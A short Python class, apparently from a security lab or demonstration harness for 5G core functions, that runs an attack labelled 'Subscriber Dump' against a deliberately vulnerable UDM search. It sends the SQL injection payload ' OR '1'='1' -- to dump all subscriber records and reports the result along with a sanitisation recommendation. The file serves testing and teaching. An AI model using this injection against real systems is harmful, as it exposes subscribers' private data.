from __future__ import annotations

from app.database import search_subscribers_vulnerable
from attacks.base_attack import BaseAttack


class UDMSubscriberDumpAttack(BaseAttack):
    attack_id = "ATTACK-002"
    name = "Subscriber Dump"
    affected_nf = "UDM"
    endpoint = "/api/udm/vulnerable/subscribers"

    def run(self):
        query = "' OR '1'='1' --"
        records = search_subscribers_vulnerable(query)
        return self.result(
            success=bool(records),
            data={"query": query, "records": records},
            evidence=f"Vulnerable subscriber search returned {len(records)} records.",
            conclusion="Subscriber APIs should restrict object access and sanitize identifiers.",
        )
